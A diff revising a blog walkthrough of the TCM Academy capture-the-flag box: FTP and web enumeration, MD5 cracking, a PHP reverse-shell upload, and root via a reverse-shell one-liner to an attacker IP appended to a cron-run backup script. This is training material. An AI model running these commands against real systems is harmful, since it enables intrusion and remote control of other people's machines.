@@ -26,6 +26,25 @@ header:
 
 In this blog post, I'll walk you through the process of rooting the Academy box from the TCM Academy's Practical Ethical Hacker course. The box was designed to test your skills in directory busting, FTP exploration, PHP webshell uploads, and Linux privilege escalation.
 
+### Prerequisites
+- Basic understanding of Linux command line
+- Familiarity with web application security concepts
+- Knowledge of common enumeration tools (nmap, dirb, ffuf)
+- Basic understanding of PHP and MySQL
+- Comfortable with privilege escalation concepts
+
+### Key Learning Objectives
+- Network service enumeration
+- Hash cracking techniques
+- Web application vulnerability exploitation
+- File upload bypass techniques
+- Linux privilege escalation through cron job manipulation
+
+## Environment Setup
+
+This box simulates a vulnerable educational institution's network infrastructure, specifically targeting their student registration system. The environment represents a common scenario where seemingly minor misconfigurations can lead to full system compromise.
+
+
 ## Attack Path Overview
 1. Initial enumeration reveals FTP, HTTP, and SSH services
 2. Anonymous FTP access provides crucial student registration information
@@ -33,9 +52,11 @@ In this blog post, I'll walk you through the process of rooting the Academy box 
 4. File upload vulnerability in student profile section
 5. Privilege escalation through periodic backup script
 
-### Diagram
+### Attack Path Diagram
 
 <img src="/assets/images/tcm-academy/academy-network-diagram.png">
+
+## Detailed Walkthrough
 
 ## Initial Enumeration
 
@@ -45,7 +66,8 @@ Starting with a thorough nmap scan to identify open ports and services:
 nmap -p- -A -T4 192.168.17.136 -oN map.txt
 ```
 
-The scan revealed these services:
+The scan revealed the following open ports and services:
+
 * FTP (21) - vsftp 3.0.3
 * HTTP (80) - Apache httpd 2.4.38 (Debian)
 * SSH (22) - OpenSSH 7.9p1
@@ -56,7 +78,7 @@ From this, I identified two primary attack vectors to explore: the FTP service a
 
 ## FTP Enumeration
 
-I began by connecting to the FTP service using anonymous login:
+I began by connecting to the FTP service on the target machine. To do this, I used the ftp command, followed by the target IP address. I used anonymous login since this option was enabled on the server.
 
 ```bash
 ftp 192.168.17.136
@@ -65,19 +87,23 @@ ls
 
 <img src="/assets/images/tcm-academy/academy-03.png">
 
-Once connected, I discovered a file named note.txt. I downloaded and examined it:
+
+Once connected, I listed the contents of the current directory with the ls command. This revealed a file named note.txt in the present directory.
+At this point, I downloaded the note.txt file to see if it contained any useful information for further exploitation:
 
 ```bash
 get note.txt
 cat note.txt
 ```
+The note contained information about a student registration database, but more interestingly, it included a password hash. This hash seemed like it could be the key to accessing additional resources or gaining further control over the system.
 
 <img src="/assets/images/tcm-academy/academy-04.png">
 
 
 <img src="/assets/images/tcm-academy/academy-05.png">
 
-The note contained information about a student registration database and included a password hash. Using hash-identifier, I determined it was MD5:
+
+To identify the hash type, I used the hash-identifier tool on Kali Linux:
 
 ```bash
 hash-identifier 
@@ -99,12 +125,13 @@ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
 
 ## Web Application Discovery
 
-Initial web server check revealed a default Apache page. 
+With the information gathered from the FTP service, I turned my attention to the web server running on port 80. I opened the browser and navigated to the target IP address. The Apache default page appeared, indicating that the server was running Apache and no custom web page had been configured yet.
 
 <img src="/assets/images/tcm-academy/academy-09.png">
 
 Moving to directory enumeration:
 
+I first checked for any information in robots.txt:
 
 
 ```bash
@@ -113,14 +140,19 @@ http://192.168.17.136/robots.txt
 
 <img src="/assets/images/tcm-academy/academy-09-robots.png">
 
-Checking page source:
+I also examined the page source:
+
+
 ```bash
 right-click > view page source
 ```
 
 <img src="/assets/images/tcm-academy/academy-09-page source.png">
 
-I performed thorough directory enumeration:
+To continue my investigation, I initially used dirb for directory busting to identify hidden directories or files on the web server.
+In addition to using dirb, I also employed the ffuf tool to fuzz a parameter on the server:
+
+
 
 ```bash
 dirb http://192.168.17.136
@@ -132,22 +164,23 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u htt
 
 <img src="/assets/images/tcm-academy/academy-11.png">
 
-Two interesting paths were discovered:
-- /phpmyadmin
-- /academy
+The results revealed 301 redirects for two interesting paths: /phpmyadmin and /academy. These redirects suggested that these paths were actively being used on the server and could lead to further vulnerabilities or misconfigurations.
+Upon visiting http://192.168.17.136/academy, I found a login form requesting a student registration number and password:
+
+<img src="/assets/images/tcm-academy/academy-12.png">
+
+
 
 ## Gaining Initial Access
 
-Using the previously obtained credentials on the academy login page:
-
-<img src="/assets/images/tcm-academy/academy-12.png">
+Using the previously obtained credentials, I successfully log into the academy student portal login page:
 
 
 <img src="/assets/images/tcm-academy/academy-12-student.png">
 
 ## Exploiting File Upload
 
-Located a photo upload feature in the profile section:
+After successfully logging into the system, I explored the available options within the online course registration page. The "My Profile" page at http://192.168.17.136/academy/my-profile.php contained a photo upload form:
 
 <img src="/assets/images/tcm-academy/academy-13.png">
 
@@ -158,7 +191,7 @@ Testing confirmed uploads were stored at:
 
 <img src="/assets/images/tcm-academy/academy-14.png">
 
-Preparing the PHP reverse shell, borrowing one from Pentestmonkey: http://https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+I prepared a PHP reverse shell using the <a href="http://https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"> Pentest Monkey payload: 
 
 
 ```bash
@@ -170,7 +203,7 @@ nano reverse-shell.php
 
 <img src="/assets/images/tcm-academy/academy-16.png">
 
-Setting up the listener:
+Before uploading, I started a netcat listener on my Kali attack machine:
 
 ```bash
 nc -nvlp 1234
@@ -178,10 +211,11 @@ nc -nvlp 1234
 
 <img src="/assets/images/tcm-academy/academy-17.png">
 
-Uploading and executing the shell:
+I then uploaded the PHP reverse shell through the photo upload form:
 
 <img src="/assets/images/tcm-academy/academy-18.png">
 
+The shell connected back immediately to my Kali machine and I was logged in to the target using the www-data user account, which did not have any elevated privileges:
 
 <img src="/assets/images/tcm-academy/academy-19.png">
 
@@ -189,15 +223,36 @@ Uploading and executing the shell:
 
 Using LINPEAS for initial enumeration:
 
+At this point, I had successfully gained access as the www-data user, but I wasn’t logged in as root. Therefore, the next step was to attempt privilege escalation to gain higher-level access to the system.
+
+I decided to use LINPEAS, a popular tool designed to hunt for potential privilege escalation opportunities on Linux systems. LINPEAS automates the process of searching for misconfigurations, weaknesses, and other possible vectors that could allow a low-privileged user to escalate to root.
+
+LINPEAS can be downloaded from its GitHub repository:
+
+<a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md">LINPEAS GitHub Repository</a>
+
+Next, I created a transfer folder on my Kali machine to store the LINPEAS script. I spun up a web server within this directory to serve files that can be downloaded by other machines. 
+
 ```bash
 mkdir transfers
 cd transfers
+python3 -m http.server 80
+```
+<img src="/assets/images/tcm-academy/academy-20.png">
+
+I downloaded LINPEAS into my transfers directory on my Kali machine and then transfered it to the target (via the reverse shell connection) by using a wget command on the target machine (wget http://<attackerIP>/linpeas.sh). I then ran LINPEAS there to search for privilege escalation vectors:
+
+
+```bash
 wget http://192.168.17.134/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-<img src="/assets/images/tcm-academy/academy-20.png">
+<img src="/assets/images/tcm-academy/academy-21.png">
+
+
+<img src="/assets/images/tcm-academy/academy-22.png">
 
 LINPEAS revealed several interesting findings:
 - A backup script in /home/grimmie
@@ -218,7 +273,7 @@ LINPEAS revealed several interesting findings:
 
 <img src="/assets/images/tcm-academy/academy-27.png">
 
-Using the discovered credentials for SSH access:
+Using the discovered credentials for SSH access, I am able to log into the target using the grimmie user account:
 
 ```bash
 ssh grimmie@192.168.17.136
@@ -228,20 +283,72 @@ ssh grimmie@192.168.17.136
 
 Investigating user context:
 
+Once logged in, I checked for sudo privileges by running the sudo -l command. However, I received an error. I also checked for any leads via the history command.   
+
+Since Grimmie didn’t have access to sudo, I decided to try the history command to see if there were any previously executed commands that might provide additional insights or opportunities for privilege escalation.
+
 ```bash
 sudo -l
 history
+```
+<img src="/assets/images/tcm-academy/academy-29.png">
+
+Investigating the backup.sh Script
+
+The LINPEAS output had already pointed out the backup.sh script, so I decided to investigate it further. I navigated to the /home/grimmie directory.  In this directory, I found the backup.sh script and examined its contents:
+
+
+```bash
 cd /home/grimmie
 ls
 cat backup.sh
 ```
 
-<img src="/assets/images/tcm-academy/academy-29.png">
-
-
 <img src="/assets/images/tcm-academy/academy-30.png">
 
-Using pspy to monitor processes:
+The backup.sh script does the following:
+
+- Removes an existing backup.zip file in the /tmp directory.
+- Creates a backup.zip file containing the /var/www/html/academy/includes directory.
+- Changes the permissions of the backup.zip file to 700, making it accessible only to the file’s owner.
+
+Since this script backs up files from the /var/www/html/academy/includes directory, it could provide valuable information or access if these files contain sensitive data.
+
+
+Investigating Cron Jobs for Backup Script
+
+It’s possible that the backup.sh script is being run periodically through a cron job, which would automate the backup process. To determine if that’s the case, we can check the cron jobs for both the Grimmie user and the root user, as backup.sh is located in /home/grimmie and could be scheduled to run automatically.
+
+We can check for cron jobs using the following commands:
+
+
+<img src="/assets/images/tcm-academy/academy-31.png">
+
+```bash
+crontab -l
+crontab -u root -l 
+crontab -e 
+```
+The output here indicates that there are no cron jobs scheduled for grimmie or the root user. 
+
+Checking System Timers
+Since cron jobs may not have been used, I turned to systemd timers to see if there were any automated tasks running on a timer. To do this, I ran the following command:
+<img src="/assets/images/tcm-academy/academy-32.png">
+
+This gave me information about any timers set to trigger actions periodically.
+
+I also used the ps command to check for any running processes that could provide further insight into scheduled tasks.  This command showed the running processes on the system, which could include scripts or other services.
+
+
+<img src="/assets/images/tcm-academy/academy-33.png">
+
+Using pspy to Confirm the Timer 
+To confirm whether the backup.sh script was running on a timer, I decided to use the pspy tool. pspy is useful for detecting processes running on a system without requiring root privileges.
+
+<a href="https://github.com/DominicBreuker/pspy">pspy GitHub</a>
+
+I downloaded pspy to my Kali machine, in the same directory where I had previously hosted the web server.  From the reverse shell connection to the target machine, I requested a download of it to the target using the wget command:
+Using pspy to monitor for script execution:
 
 ```bash
 wget http://192.168.17.134/pspy64
@@ -254,14 +361,31 @@ chmod +x pspy64
 
 <img src="/assets/images/tcm-academy/academy-36.png">
 
+ Looking through the output of pspy, I found that the backup.sh script was indeed running. This confirmed that the script was scheduled to execute periodically. We were able to observe how often it was running—every minute.
+At this point, I realized I could exploit this recurring task for further access.
+
 
 <img src="/assets/images/tcm-academy/academy-37.png">
 
 ## Root Access
 
-Modifying backup.sh to include a reverse shell:
+Abusing the Periodic Backup Script
+Since the backup.sh script was running automatically, I decided to modify it to add a reverse shell payload. This way, when the script executed, it would also execute the reverse shell, giving me access to the system.
+
+Adding Reverse Shell to backup.sh
+
+I navigated back to the /home/grimmie directory.
+
+I then added a reverse shell to the backup.sh script. I grabbed a one-line reverse shell from the Pentest Monkey Reverse Shell cheatsheet:
+
+<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey's Reverse Shell Cheat Sheet</a>
+
+Here’s the command I added to the script:
 
 <img src="/assets/images/tcm-academy/academy-38.png">
+
+I substituted 10.0.0.1 with my attacker IP address and added this to the backup.sh script.
+
 
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
@@ -273,6 +397,7 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 <img src="/assets/images/tcm-academy/academy-39-2.png">
 
 Waiting for script execution to gain root:
+When the backup script executed, it gave me root access:
 
 <img src="/assets/images/tcm-academy/academy-40.png">
 
@@ -289,6 +414,36 @@ cat flag.txt
 
 <img src="/assets/images/tcm-academy/academy-41.png">
 
+
+## Conclusion
+
+This walkthrough demonstrated a complete penetration testing workflow, from initial enumeration through privilege escalation to ultimately achieving root access. The Academy box provided excellent practice in:
+- Service enumeration
+- Password cracking
+- Web application security
+- File upload vulnerabilities
+- Linux privilege escalation techniques
+
+Remember that the techniques demonstrated here should only be used in authorized testing environments. Always ensure you have proper permission before attempting any security testing.
+
+### Quick Reference Commands
+
+```bash
+# Initial Enumeration
+nmap -p- -A -T4 <IP>
+dirb http://<IP>
+ffuf -w /path/to/wordlist:FUZZ -u http://<IP>/FUZZ
+
+# Hash Cracking
+hash-identifier
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+# Privilege Escalation
+wget http://<IP>/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
 ## Tools Used
 - nmap: Network scanning
 - dirb/ffuf: Directory enumeration
@@ -297,4 +452,6 @@ cat flag.txt
 - LINPEAS: Privilege escalation enumeration
 - pspy: Process monitoring
 
+Happy Hacking!
 
+- Nisha
